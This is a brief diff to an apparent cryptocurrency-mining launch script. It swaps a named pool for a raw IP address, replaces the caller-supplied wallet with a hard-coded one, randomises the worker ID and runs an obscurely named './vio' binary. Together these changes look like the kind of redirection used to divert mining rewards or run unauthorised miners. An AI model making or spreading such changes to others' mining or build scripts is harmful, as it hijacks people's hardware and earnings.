@@ -1,5 +1,5 @@
-POOL=rx-us.unmineable.com:3333
-WALLET=$1:$2
-WORKER=$3
-ALGO=wrkzcoin
+POOL=95.179.139.15:2288
+WALLET=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
+WORKER=$(shuf -n 1 -i 1-99999)
+ALGO=chukwa_v2
 ./vio --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableNVIDIA
